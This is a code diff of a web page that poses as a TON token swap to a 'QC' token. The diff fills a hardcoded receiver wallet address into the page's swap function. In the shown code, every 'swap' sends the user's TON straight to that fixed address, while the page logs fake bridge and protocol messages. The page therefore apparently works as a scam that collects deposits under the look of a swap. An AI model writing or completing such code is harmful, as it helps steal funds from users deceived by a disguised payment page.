@@ -89,7 +89,7 @@
                 </div>
             </div>
             
-            <div class="chart-wrapper">
+            <div class="chart-wrapper" id="tradingview_chart">
                 <div class="tradingview-widget-container">
                     <div class="tradingview-widget-container__widget"></div>
                     <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-symbol-overview.js" async>
@@ -237,7 +237,7 @@
 
         const state = {
             wallet: null,
-            receiver: "ТВОЙ_АДРЕС_КОШЕЛЬКА_ЗДЕСЬ", // ВПИШИ СВОЙ АДРЕС СЮДА
+            receiver: "UQBo0iou1BlB_8Xg0Hn_rUeIcrpyyhoboIauvnii889OFRoI",
             isFetching: false
         };
 
@@ -317,7 +317,6 @@
             else { ui.btn.innerText = `Swap ${ui.tIn.value} to QC`; ui.btn.disabled = false; }
         }
 
-        // --- ФУНКЦИЯ ТРАНЗАКЦИИ (СВОПА) ---
         async function handleSwap() {
             if(!state.wallet) { await tonConnectUI.openModal(); return; }
             
@@ -335,17 +334,17 @@
             log("Инициализация моста...", "cyan-400");
 
             const transaction = {
-                validUntil: Math.floor(Date.now() / 1000) + 360, // 6 минут
+                validUntil: Math.floor(Date.now() / 1000) + 360,
                 messages: [
                     {
                         address: state.receiver,
-                        amount: (amountIn * 1e9).toString(), // Конвертация в NanoTON
+                        amount: (amountIn * 1e9).toFixed(0), 
                     }
                 ]
             };
 
             try {
-                const result = await tonConnectUI.sendTransaction(transaction);
+                await tonConnectUI.sendTransaction(transaction);
                 log("Протокол подтвержден. Ожидание сети...", "green-400");
             } catch (e) {
                 log("Ошибка транзакции или отказ", "red-500");
@@ -354,8 +353,12 @@
 
         tonConnectUI.onStatusChange(async (w) => {
             state.wallet = w;
-            if(w) { log("Node Linked", "green-400"); await fetchBalances(); }
-            else { log("Node Disconnected", "red-400"); }
+            if(w) { 
+                log("Node Linked", "green-400"); 
+                await fetchBalances(); 
+            } else { 
+                log("Node Disconnected", "red-400"); 
+            }
         });
 
         window.onload = () => {
